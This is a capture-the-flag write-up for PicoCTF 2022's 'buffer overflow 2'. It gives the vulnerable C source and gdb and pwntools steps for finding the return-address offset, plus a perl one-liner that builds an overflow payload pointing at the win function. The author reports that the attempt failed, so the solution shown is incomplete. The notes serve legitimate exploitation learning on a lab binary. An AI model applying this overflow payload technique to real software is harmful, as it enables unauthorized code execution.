
                            buffer overflow 2  
					 --------------------------------------		  
 ( Pwntools & GDB for Buffer Overflow w/ Arguments (PicoCTF 2022 #43 'buffer-overflow2'))
			
                          

problem URL: 
https://play.picoctf.org/practice/challenge/259
https://www.youtube.com/watch?v=26mEa1Ojux8&list=PL1H1sBF1VAKUbRWMCzEBi61Z_7um7V5Sd&index=43
 

https://y4riss.github.io/posts/picoctf-bufferoverflow2/

https://blog.hyperboly.net/posts/guides/buffer-overflow-2/
https://musyokaian.medium.com/buffer-overflow-2-picoctf-2022-590cf7b7961f


Description
 Control the return address and arguments This time you'll need to control
 the arguments to the function you return to! Can you get the flag from
 this program?
        https://artifacts.picoctf.net/c/143/vuln
 You can view source here:
      https://artifacts.picoctf.net/c/143/vuln.c
 And connect with it using 
 'nc saturn.picoctf.net 50229'
 
Hints:
 Try using GDB to print out the stack once you write to it.
 
 source:

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}

note: The win function isn’t called from main or vuln, so we have 
  to  another way to get there.
 
Solution:
  
   1. wget     https://artifacts.picoctf.net/c/143/vuln
      chmod +x vuln
   
   2.Run  gdb vuln  and Find the win:
	
	 gdb vuln
	(gdb) info function win
      All functions matching regular expression "win":

       Non-debugging symbols:
       0x08049296  win
	   
    So win is at 0x08049296.
	  
	3. Now if we control the return address, we can basically control the whole program and 
	    redirect it to wherever we want.
     To determine how many bytes we need, we can generate a pattern using cyclic ,
 	 feed it to the program and analyze it using gdb

      let’s generate a pattern of 120 bytes
	  pwn cyclic 120
         aaaabaaacaaadaaa......
	4. Now let’s open our binary in gdb, feeding it that input.	
       gdb  vlun
	   gef> r : run the proram
	   output :  the gef screen 
	   We are interested in the EIP register, since EIP points to the instruction that the
	   CPU is going to execute.
       On the gef screen  we read :' $eip   : 0x62616164 ("daab"?)'

     5.    As you can notice, EIP points to 'daab', which is a substring in our pattern,
 	  now we can easily determine the offset:
              pwn cyclic -l daab
              output: 112
      so we need exactly 112 bytes to hit the EIP.

    7. create a flag.txt file in our home directory in order to test the program.  
	     echo > flag.txt
    8. Now let’s feed the program with 112 chars + the address of win. 
	   you can use perl for that.
	   Note : we need to write the address '  0x08049296' in reverse, respecting the
	   little endian byte order.
	   so the command is 
	   perl -e 'print "A" x 112 . "\x96\x92\x04\x08" ' > payload
	9.  
	   run it with gdb, make a breakpoint in the win function, and see if we hit it.
	   
	   gdb ./vuln
       b win
       run < payload
	   
	   
	   Doesn't work.
	   No soultion 
  ===============================
	picoCTF{ }
   
 
  
 
 
	
	  


